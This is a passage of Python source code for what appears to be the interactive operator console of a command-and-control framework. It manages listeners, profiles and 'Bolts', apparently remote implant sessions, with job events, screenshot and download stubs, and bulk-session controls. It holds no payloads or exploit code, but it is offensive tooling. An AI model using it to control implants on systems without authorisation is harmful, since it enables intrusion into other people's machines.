                self.shell.cirrus.profile_add(n, c)
                print(f'[+] Profile "{n}" imported.')
            else:
                self.shell.cirrus.profile_update(n, c)
                print(f'[+] Profile "{n}" updated!')
        except ValueError as err:
            return print(f"[!] {err}!")
        self.shell.cache._profiles = None
        del c


class _MenuListener(object):
    _MENU = [
        "back",
        "delete",
        "exit",
        "help",
        "info",
        "main",
        "profile",
        "replace",
        "update",
    ]

    def __init__(self, shell):
        self.name = None
        self.shell = shell
        self.quick_back = True

    def do_back(self, _):
        self.shell.set_menu(MENU_LISTENERS)

    def do_info(self, _):
        try:
            _print_listener_info(self.shell.cirrus.listener(self.name))
        except ValueError as err:
            print(f"[!] {err}!")

    def do_delete(self, _):
        if not _do_ask(f'Confirm deletion of Listener "{self.name}"?'):
            return print("[-] Aborting delete!")
        try:
            self.shell.cirrus.listener_delete(self.name)
        except ValueError as err:
            return print(f"[!] {err}!")
        self.shell.cache._listeners = None
        self.shell.set_menu(MENU_LISTENERS)

    def do_profile(self, _):
        try:
            r = self.shell.cirrus.listener(self.name)
            if "profile_name" not in r:
                return print(
                    f'[!] Listener "{self.name}" does not have an associated Profile!'
                )
            self.shell.cirrus.profile(r["profile_name"])
            self.shell.set_menu(MENU_PROFILE, r["profile_name"])
            del r
        except ValueError as err:
            print(f"[!] {err}!")

    def prompt(self, args=None):
        self.name = args
        return f" > Listener > {args} > "

    def completenames(self, n, *_):
        return _menu(n, _MenuListener._MENU)

    def do_update(self, a, profile):
        self._upgrade("update", a, profile)

    def do_replace(self, a, profile):
        self._upgrade("replace", a, profile)

    def complete_update(self, n, c, *_):
        return self.complete_replace(n, c, _)

    def complete_replace(self, n, c, *_):
        if c.count(" ") == 2:
            return self.shell.cache.profiles(n)
        return list()

    def _upgrade(self, name, address, profile):
        if not nes(address) or not nes(profile):
            return print(f"{name} <address> <profile>")
        try:
            r = self.shell.cirrus.listener_update(self.name, address, profile)
        except ValueError as err:
            return print(f"[!] {err}!")
        c = Config(b64decode(r["profile"], validate=True))
        print(f'[+] Listener "{self.name}" @ {r["listener"]["address"]} ({c}) updated!')
        del r
        del c
        self.shell.cache._listeners = None


class _MenuListeners(object):
    _MENU = [
        "back",
        "bolts",
        "delete",
        "exit",
        "help",
        "info",
        "list",
        "ls",
        "main",
        "new",
        "profile",
        "profiles",
        "replace",
        "update",
    ]

    def __init__(self, shell):
        self.shell = shell
        self.quick_back = True

    def do_ls(self, _):
        return self.do_list(_)

    def do_list(self, _):
        try:
            return self.shell.cirrus.show_listeners()
        except ValueError as err:
            print(f"[!] {err}!")

    def default(self, n):
        if len(n) == 0:
            return
        try:
            self.shell.cirrus.listener(n)
        except ValueError:
            return print(f'[!] Listener "{n}" does not exist!')
        self.shell.set_menu(MENU_LISTENER, n.lower())

    def do_info(self, n):
        if len(n) == 0:
            return print("info <name|all>")
        try:
            if n == "all":
                for v in self.shell.cirrus.listeners().values():
                    _print_listener_info(v)
                return
            _print_listener_info(self.shell.cirrus.listener(n))
        except ValueError:
            return print(f'[!] Listener "{n}" does not exist!')

    def do_bolts(self, _):
        self.shell.set_menu(MENU_BOLTS)

    def do_delete(self, n):
        if len(n) == 0:
            return print("delete <name|all>")
        try:
            if n == "all":
                if not _do_ask("Confirm deletion of ALL Listeners?"):
                    return print("[-] Aborting delete!")
                for e in self.shell.cirrus.listeners():
                    self.shell.cirrus.listener_delete(e["name"])
                    print(f'[+] Deleted Listener "{e["name"]}".')
                print("[+] All Listeners deleted!")
            else:
                if not _do_ask(f'Confirm deletion of Listener "{n}"?'):
                    return print("[-] Aborting delete!")
                self.shell.cirrus.listener_delete(n)
                print(f'[+] Deleted Listener "{n}".')
        except ValueError as err:
            return print(f"[!] {err}!")
        self.shell.cache._listeners = None

    def do_profile(self, n):
        if len(n) == 0:
            return print("profile <name>")
        try:
            r = self.shell.cirrus.listener(n)
            if "profile_name" not in r:
                return print(f'[!] Listener "{n}" does not have an associated Profile!')
            self.shell.cirrus.profile(r["profile_name"])
            self.shell.set_menu(MENU_PROFILE, r["profile_name"])
            del r
        except ValueError as err:
            print(f"[!] {err}!")

    def do_profiles(self, _):
        self.shell.set_menu(MENU_PROFILES)

    def prompt(self, args=None):
        return " > Listeners > "

    def completenames(self, n, *_):
        return _menu(n, _MenuListeners._MENU + self.shell.cache.listeners(n))

    def complete_info(self, n, *_):
        return _complete_with_all(self.shell.cache.listeners(n), n)

    def do_new(self, n, a, profile):
        if not nes(n) or not nes(a) or not nes(profile):
            return print("new <name> <address> <profile>")
        try:
            r = self.shell.cirrus.listener_add(n, a, profile)
        except ValueError as err:
            return print(f"[!] {err}!")
        c = Config(b64decode(r["profile"], validate=True))
        print(f'[+] Listener "{n}" @ {r["listener"]["address"]} ({c}) created!')
        del r
        del c
        self.shell.cache._listeners = None

    def complete_new(self, n, c, *_):
        if len(c) > 0 and c.count(" ") == 3:
            return self.shell.cache.profiles(n)
        return list()

    def complete_delete(self, n, *_):
        return _complete_with_all(self.shell.cache.listeners(n), n)

    def complete_profile(self, n, *_):
        return self.shell.cache.listeners(n)

    def do_update(self, n, a, profile):
        self._upgrade("update", n, a, profile)

    def complete_update(self, n, c, *_):
        return self.complete_replace(n, c, _)

    def do_replace(self, n, a, profile):
        self._upgrade("replace", n, a, profile)

    def complete_replace(self, n, c, *_):
        if c.count(" ") == 1:
            return self.shell.cache.listeners(n)
        if c.count(" ") == 3:
            return self.shell.cache.profiles(n)
        return list()

    def _upgrade(self, name, n, address, profile):
        if not nes(n) or not nes(address) or not nes(profile):
            return print(f"{name} <name> <address> <profile>")
        try:
            r = self.shell.cirrus.listener_update(n, address, profile)
        except ValueError as err:
            return print(f"[!] {err}!")
        c = Config(b64decode(r["profile"], validate=True))
        print(f'[+] Listener "{n}" @ {r["listener"]["address"]} ({c}) updated!')
        del r
        del c
        self.shell.cache._listeners = None


class _MenuBoltAll(_MenuBolt):
    def __init__(self, shell):
        _MenuBolt.__init__(self, shell)
        self.matcher = None

    def prompt(self, args=None):
        self.filter = None
        self.matcher = args
        if self.matcher is not None:
            return f" > Bolts > [{self.matcher}] > "
        return " > Bolts > [ALL] > "

    def do_chan(self, _):
        pass

    def do_info(self, _):
        pass

    def do_screenshot(self, n):
        # Append host ID
        pass

    def do_download(self, n):
        pass

    def do_nodisplay(self, _):
        pass

    def do_display(self, n):
        pass

    def _exec(self, f, **a):
        if not isinstance(a, dict):
            a = dict()
        try:
            if self.matcher is None:
                # NOTE(dij): Matcher is empty, use cache.
                for v in self.shell.cache.bolts(None):
                    f(v, **a)
                return
            for v in self.shell.cirrus.sessions():
                if not self.matcher.matches(v):
                    continue
                f(v["id"], **a)
        except (ValueError, TypeError) as err:
            print(f"[!] {err}!")


class Shell(Cmd):
    def __init__(self, cirrus):
        Cmd.__init__(self, stdin=stdin, stdout=stdout, completekey="tab")
        self._state = 0
        self.cirrus = cirrus
        self.cache = _Cache(cirrus)
        self._module = import_module(__name__)
        self.set_menu(0)

    def enter(self):
        try:
            self.cirrus.start(True, events=self._on_event)
        except Exception as err:
            self.cirrus.close()
            return print(
                f"\n[!] {err.__class__.__name__} {err}\n{format_exc(10)}", file=stderr
            )
        h = expanduser(HISTORY_FILE)
        try:
            read_history_file(h)
        except (OSError, ValueError):
            pass
        set_history_length(400)
        try:
            self.cmdloop(
                'Welcome to the Doppler  shell. Use "help" to display the command guide.\n'
                "Happy hacking!"
            )
        except KeyboardInterrupt:
            print()
        except Exception as err:
            print(
                f"\n[!] {err.__class__.__name__} {err}\n{format_exc(10)}", file=stderr
            )
        try:
            write_history_file(h)
        except OSError:
            pass
        del h
        self.cirrus.close()

    def _on_main(self):
        return self._menu is None or isinstance(self._menu, _MenuMain)

    def _backable(self):
        return (
            not self._on_main()
            and hasattr(self._menu, "quick_back")
            and self._menu.quick_back
        )

    def onecmd(self, n):
        c, a, n = self.parseline(n)
        if not nes(n):
            return self.emptyline()
        if c is None:
            if self._backable():
                return self._menu.do_back(None)
            if not self._on_main():
                try:
                    return self._menu.default(n)
                except AttributeError:
                    pass
            return self.default(n)
        self.lastcmd = n
        if n == "EOF":
            self.lastcmd = ""
        if c == "":
            if a == ".." and self._backable():
                if not hasattr(self._menu, "do_back"):
                    return self.set_menu(MENU_MAIN)
                return self._menu.do_back(None)
            if a == "\\" and self._backable():
                return self.set_menu(MENU_MAIN)
            if self._menu is not None:
                try:
                    return self._menu.default(n)
                except AttributeError:
                    pass
            return self.default(n)
        if c == "main" and not self._on_main() and not hasattr(self._menu, "do_main"):
            return self.set_menu(MENU_MAIN)
        if c == "back" and not self._on_main() and not hasattr(self._menu, "do_back"):
            return self.set_menu(MENU_MAIN)
        if c == "exit" and not hasattr(self._menu, "do_exit"):
            return self.do_exit(None)
        if c == "help" and not hasattr(self._menu, "do_help"):
            return self.do_help(None)
        try:
            if self._menu is not None:
                f = getattr(self._menu, "do_" + c)
            else:
                f = getattr(self, "do_" + c)
        except AttributeError:
            if self._menu is not None:
                try:
                    return self._menu.default(n)
                except AttributeError:
                    pass
            return self.default(n)
        del c
        del n
        if f.__code__.co_argcount == 1:
            try:
                v = split(a)
            except ValueError:
                return f(a)
            else:
                return f(*v)
        if f.__code__.co_argcount > 2:
            try:
                v = split(a)
            except ValueError:
                return f(a)
            if len(v) == f.__code__.co_argcount - 1:
                return f(*v)
            i = [None] * (f.__code__.co_argcount - 1)
            for x in range(0, len(v)):
                if x >= len(i) or x >= len(v):
                    break
                i[x] = v[x]
            if len(v) > len(i):
                i[-1] = " ".join(v[len(i) - 1 :])
            del v
            return f(*i)
        return f(a)

    def emptyline(self):
        return None

    def do_exit(self, _):
        raise EOFError()

    def do_help(self, _):
        print(HELP_TEXT[self._state])

    def default(self, cmd):
        return None

    def complete(self, text, s):
        if s == 0:
            v = get_line_buffer()
            o = v.lstrip()
            i = len(v) - len(o)
            del v
            x = get_begidx() - i
            e = get_endidx() - i
            del i
            if x <= 0:
                f = self._complete_func(x, "")
            else:
                c, _, _ = self.parseline(o)
                f = self._complete_func(x, c)
                del c
            self.completion_matches = f(text, o, x, e)
            del f
            del o
            del x
            del e
        try:
            return self.completion_matches[s]
        except IndexError:
            return None

    def completedefault(self, *_):
        return list()

    def cmdloop(self, intro=None):
        self.preloop()
        if self.completekey:
            self.old_completer = get_completer()
            set_completer(self.complete)
            parse_and_bind(self.completekey + ": complete")
        try:
            if intro is not None:
                self.intro = intro
            if self.intro:
                self.stdout.write(str(self.intro) + "\n")
            o = 0
            s = None
            while not s:
                try:
                    if self.cmdqueue:
                        n = self.cmdqueue.pop(0)
                    else:
                        try:
                            n = input(self.prompt)
                        except EOFError:
                            print()
                            break
                        o = 0
                    n = n.strip()
                    n = self.precmd(n)
                    s = self.onecmd(n)
                    s = self.postcmd(s, n)
                    del n
                except EOFError:
                    break
                except KeyboardInterrupt as err:
                    if not self._on_main():
                        try:
                            r = getattr(self._menu, "interrupts")
                            if isinstance(r, int) and o < r:
                                print()
                                o += 1
                                continue
                            del r
                        except AttributeError:
                            pass
                        print()
                        if not hasattr(self._menu, "do_back"):
                            self.set_menu(MENU_MAIN)
                        else:
                            self._menu.do_back(None)
                        continue
                    elif o == 1:
                        raise err
                    o += 1
                    print(
                        '\nCtrl-C pressed. (Press Ctrl-C again, type "exit" or press Ctrl-D to exit)',
                        file=self.stdout,
                    )

            self.postloop()
        finally:
            if self.completekey:
                set_completer(self.old_completer)

    def _complete_func(self, b, cmd):
        if b <= 0:
            if self._menu is None:
                return self.completenames
            try:
                f = getattr(self._menu, "completenames")
                if callable(f):
                    return f
                del f
            except AttributeError:
                pass
            return self.completenames
        if len(cmd) > 0:
            if self._menu is not None:
                try:
                    f = getattr(self._menu, "complete_" + cmd)
                    if callable(f):
                        return f
                    del f
                except AttributeError:
                    pass
                try:
                    f = getattr(self._menu, "completedefault")
                    if callable(f):
                        return f
                    del f
                except AttributeError:
                    pass
        else:
            if self._menu is not None:
                try:
                    f = getattr(self._menu, "completedefault")
                    if callable(f):
                        return f
                    del f
                except AttributeError:
                    pass
            try:
                f = getattr(self, "complete_" + cmd)
                if callable(f):
                    return f
                del f
            except AttributeError:
                pass
            pass
        return self.completedefault

    def set_menu(self, index, args=None):
        m = MENUS[index]
        if m[1] is None:
            m[1] = getattr(self._module, m[0])(self)
        self._menu = m[1]
        self._state = index
        self.prompt = self._menu.prompt(args)
        del m

    def _on_event(self, a, id, msg, job):
        if a == "job_new" or a == "job_delete":
            self.cache._jobs = None
            return
        if a == "profile_new" or a == "profile_delete" or a == "profile_update":
            self.cache._profiles = None
            return
        if a == "listener_new" or a == "listener_update" or a == "listener_delete":
            self.cache._listeners = None
            return
        if a == "session_new":
            if self._state == MENU_MAIN or self._state == MENU_BOLTS:
                print("\n[*] " + msg)
            self.cache._bolts = None
            return
        if a == "session_delete":
            self.cache._bolts = None
            if self._state == MENU_BOLT and self._menu.id == id:
                print(f"\n[*] {id}: This Bolt was removed or shutdown.")
            return
        if self._state == MENU_BOLT:
            if self._menu.id != id:
                return
            if a == "job_receiving" or a == "job_update" or a == "session_update":
                return print("\n[*] " + msg)
            if a == "job_complete":
                return self.cirrus.job_display(id, job, True)
            return
        if self._state != MENU_BOLT_ALL:
            return
        if a == "job_receiving" or a == "job_update" or a == "session_update":
            return print("\n[*] " + msg)
        if a == "job_complete" and self._menu.results:
            return self.cirrus.job_display(id, job, True)
